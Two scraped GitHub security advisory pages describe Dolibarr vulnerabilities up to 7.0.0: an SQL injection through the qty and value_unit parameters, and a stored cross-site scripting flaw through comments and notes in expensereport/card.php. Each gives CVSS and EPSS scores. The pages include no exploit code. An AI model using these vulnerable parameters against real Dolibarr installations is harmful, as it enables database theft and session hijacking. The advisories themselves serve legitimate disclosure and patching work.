 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-h34q-878w-w96r)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2018-16809](/advisories/GHSA-h34q-878w-w96r)

## Dolibarr SQL injection via the integer parameters qty and value\_unit

Critical severity

GitHub Reviewed

Published
May 14, 2022
to the GitHub Advisory Database
â¢
Updated Apr 24, 2024

[Vulnerability details](/advisories/GHSA-h34q-878w-w96r)
[Dependabot alerts
0](/advisories/GHSA-h34q-878w-w96r/dependabot)

## Package

composer

dolibarr/dolibarr
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

>= 3.8, <= 7.0.0

## Patched versions

None

## Description

An issue was discovered in Dolibarr through 7.0.0. expensereport/card.php in the expense reports module allows SQL injection via the integer parameters qty and value\_unit.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2018-16809>
* [Dolibarr/dolibarr#9449](https://github.com/Dolibarr/dolibarr/issues/9449)

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2018-16809)
Mar 7, 2019

Published to the GitHub Advisory Database
May 14, 2022

Reviewed
Apr 24, 2024

Last updated
Apr 24, 2024

### Severity

Critical

9.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### EPSS score

0.512%

# Exploit Prediction Scoring System (EPSS)

This score estimates the probability of this vulnerability being exploited within the next 30 days.
Data provided by [FIRST](https://www.first.org/epss/user-guide).

 (77th percentile)

### Weaknesses

[CWE-89](/advisories?query=cwe%3A89)

### CVE ID

CVE-2018-16809

### GHSA ID

GHSA-h34q-878w-w96r

### Source code

[Dolibarr/dolibarr](https://github.com/Dolibarr/dolibarr)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-h34q-878w-w96r/improve).

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from github.com_15d1d3b6_20250126_022029.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-r3r5-fqfm-9wrh)

**CVE-2018-16808**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-r3r5-fqfm-9wrh)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2018-16808](/advisories/GHSA-r3r5-fqfm-9wrh)

## Dolibarr Stored Cross-site Scripting in expensereport/card.php

Moderate severity

GitHub Reviewed

Published
May 14, 2022
to the GitHub Advisory Database
â¢
Updated Apr 24, 2024

[Vulnerability details](/advisories/GHSA-r3r5-fqfm-9wrh)
[Dependabot alerts
0](/advisories/GHSA-r3r5-fqfm-9wrh/dependabot)

## Package

composer

dolibarr/dolibarr
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<= 7.0.0

## Patched versions

7.0.1

## Description

An issue was discovered in Dolibarr through 7.0.0. There is Stored XSS in expensereport/card.php in the expense reports plugin via the comments parameter, or a public or private note.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2018-16808>
* [Dolibarr/dolibarr#9449](https://github.com/Dolibarr/dolibarr/issues/9449)

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2018-16808)
Mar 7, 2019

Published to the GitHub Advisory Database
May 14, 2022

Reviewed
Apr 24, 2024

Last updated
Apr 24, 2024

### Severity

Moderate

6.1

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Changed

Confidentiality
Low

Integrity
Low

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

### EPSS score

0.128%

# Exploit Prediction Scoring System (EPSS)

This score estimates the probability of this vulnerability being exploited within the next 30 days.
Data provided by [FIRST](https://www.first.org/epss/user-guide).

 (49th percentile)

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### CVE ID

CVE-2018-16808

### GHSA ID

GHSA-r3r5-fqfm-9wrh

### Source code

[Dolibarr/dolibarr](https://github.com/Dolibarr/dolibarr)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-r3r5-fqfm-9wrh/improve).

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.


